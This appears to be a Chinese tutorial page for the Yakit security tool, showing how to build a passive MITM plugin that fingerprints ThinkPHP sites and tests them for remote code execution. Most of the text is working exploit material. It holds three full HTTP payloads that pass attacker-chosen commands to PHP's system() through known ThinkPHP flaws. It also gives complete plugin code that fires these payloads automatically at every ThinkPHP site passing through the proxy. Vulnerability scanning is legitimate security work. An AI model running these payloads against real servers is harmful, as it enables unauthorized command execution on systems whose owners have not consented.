---
sidebar_position: 3
---

# ThinkPHP RCE 被动扫描插件 [MITM]

## 环境搭建

环境使用 `http://vulfocus.io/`，启动一个thinkphp实例

## 指纹检测

因为可能同时开启多个被动扫描插件，如果所有网站都做一遍扫描，会造成很大程度上的资源浪费，可能会导致代理变慢

所以在开始扫描前需要对网站进行指纹识别

### header特征

使用fofa搜索`app="thinkphp"`

发现大多数thinkphp的站点header都有`X-Powered-By: ThinkPHP`

还有`X-Powered-By: thinkphp-bjyadmin`（可能是经thinkphp二开的框架）

所以可以通过正则，对header进行匹配：``

```go
thinkphpFingers = ["X-Powered-By: .*((?i)thinkphp).*"]
// headers是返回包的header
checkHeader = fn(headers){
    for _,thinkphpFinger = range thinkphpFingers{
        if re.Match(thinkphpFinger,headers) {
            return true
        }
    }
    return false
}
```

### favicon hash特征

通过thinkphp框架的默认favicon.ico识别

在yak里可以直接获取到站点favicon.ico的hash

```go
hash, err = http.RequestFaviconHash(<favicon.ico地址>)
```

得到thinkphp的favicon.ico的hash为`1165838194`，所以做如下判断

```JavaScript
// rootUrl是网站根路径
chechIcon2 = fn(rootUrl){
    hash, err = http.RequestFaviconHash(rootUrl+"favicon.ico")
    return hash == "1165838194"
}
```

### thinkphp的特殊Controller

在p牛的博客中看到thinkphp有个控制器4e5e5d7364f443e28fbf0d3ae744a59a，会返回站点的图标

所以当http://xxx.xx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a返回一个图片时，就可以判定这是thinkphp站点

```go
rsp,_ = http.Get("http://xxx.xx/?c=4e5e5d7364f443e28fbf0d3ae744a59a")
rspB,_ = http.dump(rsp)
header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)
println(string(body))
```

输出如图

![](/img/products/yakit/thinkphp5-passiveScan.png)

从这里提取出两个指纹"IHDR"和"PNG"，如下

```go
// rootUrl是网站根路径
chechIcon1 = fn(rootUrl){
    u = rootUrl+"?c=4e5e5d7364f443e28fbf0d3ae744a59a"
    rsp,_ = http.Get(u)
    rspB,_ = http.dump(rsp)
    header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)
    return str.Contains(string(body),"IHDR") && (str.Contains(string(body),"PNG") || str.Contains(string(body),"JPEG")) 
}
```

## 漏洞检测

如果返回包中包含预期的结果，就可以判定命令执行成功了，在此基础上，这个"预期的结果"还要和正常返回包区分开

如果是linux机器，可以执行这条命令`echo -n 'asdasczxc' | md5sum`，如果网站返回包包含`asdasczxc`的hash，则说明命令执行成功

如果是windows机器，可以执行`dir C:\Windows\`，因为windows机器`C:\Windows\`目录下有`system.ini`文件，所以如果返回包包含`system.ini`，则说明命令执行成功

## paylaod

可以通过[fuzz标签](https://www.yaklang.io/docs/buildinlibs/lib_fuzz#fuzz-标签定义以及使用)去写payload，如

```go
GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
```

在poc.HTTP支持使用fuzz标签

## 持久化

 yak的risk库可以对数据持久化

例如：

```go
risk.NewRisk("https://www.baidu.com", risk.title("html源码泄露"), risk.type("敏感信息泄露"),risk.level("高危"))
```

## mitm插件编写

mitm模块主要提供了5个hook方法，创建新插件时的模板有详细的注解介绍

因为每个网站只需要检测一次，所以选用`mirrorNewWebsite`方法（每当出现一个新网站时，此方法会被调用）

由于用户正常访问网站时，也会对favicon.ico进行获取，所以可以在`mirrorNewWebsitePath`方法中直接拿到favicon.ico，计算hash进行判断，相比在`mirrorNewWebsite`方法中使用`http.RequestFaviconHash`获取hash，减少了一次对favicon.ico的请求

代码如下

```go
rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
// 手动对favicon.ico的hash计算方法就是，先base64，再MMH3Hash32计算
if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp)) == "1165838194"{
    testExp(rootUrl)
}
```

上面这方法调试发现，即使是第一次访问的网站，有时浏览器不会请求favicon.ico

所以还是用常规的`http.RequestFaviconHash`方法去获取hash

## 最终代码

```go
payloads = [
    {
        "name":"thinkphp5.0.23 5.0.7 ~ 5.0.23命令执行",
        "payload":`GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36

`},

{
    "name":"Thinkphp captcha命令执行",
    "payload":`POST /index.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Length: 52
Content-Type: application/x-www-form-urlencoded
Origin: http://123.58.236.76:59844
Pragma: no-cache
Referer: http://123.58.236.76:59844/index.php?s=index/index/index
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36

s={{url({{params(cmd)}})}}&_method=__construct&filter%5B%5D=system

`},{
        "name":"5.1.x命令执行",
        "payload":`GET /index.php?s=index/\think\Request/input&filter=system&data={{url({{params(cmd)}})}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36

`}]

thinkphpFingers = ["X-Powered-By: .*((?i)thinkphp).*"]

testExp = fn(rootUrl){
    yakit_output(sprintf("%s发现thinkphp框架",rootUrl))
    host,port,_ = str.ParseStringToHostPort(rootUrl)
    target = sprintf("%s:%d",host,port)
    for _,payload = range payloads{
        out = ""
        payloadR = ""
        randomStr = str.RandStr(20)
        result = codec.Md5(randomStr)
        cmd = sprintf("echo -n '%v' | md5sum", randomStr)
        rsp,req,_ = poc.HTTP(payload["payload"], poc.params({"cmd": cmd,"target": target}))
        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        // println(string(headers))
        if str.MatchAllOfSubString(body, result){
            payloadR,_ = str.SplitHTTPHeadersAndBodyFromPacket(req)
            out = sprintf("%s存在漏洞, pocName:%s, OS: Linux",rootUrl,payload["name"])
        }

        rsp,req,_ = poc.HTTP(payload["payload"], poc.params({"cmd": "dir C:\\Windows\\","target": target}))
        headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        // println(string(headers))
        if str.MatchAllOfSubString(body, "system.ini"){
            payloadR,_ = str.SplitHTTPHeadersAndBodyFromPacket(req)
            out = sprintf("%s存在漏洞, pocName:%s, OS: Windows",rootUrl,payload["name"])
        }
        if out != ""{
            yakit_output(out)
            risk.NewRisk(rootUrl,risk.title(sprintf("%s存在RCE漏洞",rootUrl)),risk.details(out),risk.type("RCE"),risk.payload(payloadR))
        }
    }
}

checkHeader = fn(headers){
    for _,thinkphpFinger = range thinkphpFingers{
        if re.Match(thinkphpFinger,headers) {
            return true
        }
    }
    return false
}

chechIcon1 = fn(rootUrl){
    u = rootUrl+"?c=4e5e5d7364f443e28fbf0d3ae744a59a"
    rsp,_ = http.Get(u)
    rspB,_ = http.dump(rsp)
    header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)
    return str.Contains(string(body),"IHDR") && (str.Contains(string(body),"PNG") || str.Contains(string(body),"JPEG")) 
}
chechIcon2 = fn(rootUrl){
    hash, err = http.RequestFaviconHash(rootUrl+"favicon.ico")
    return hash == "1165838194"
}


# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    if checkHeader(headers) || chechIcon2(rootUrl) || chechIcon1(rootUrl){
        testExp(rootUrl)
    }
    
}

# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    // rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
    // if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp)) == "1165838194"{
    //     testExp(rootUrl)
    // }
}
```

## 插件效果

![](/img/products/yakit/thinkphp-passiveScan1.png)

![](/img/products/yakit/thinkphp-passiveScan2.png)

![](/img/products/yakit/thinkphp-passiveScan3.png)
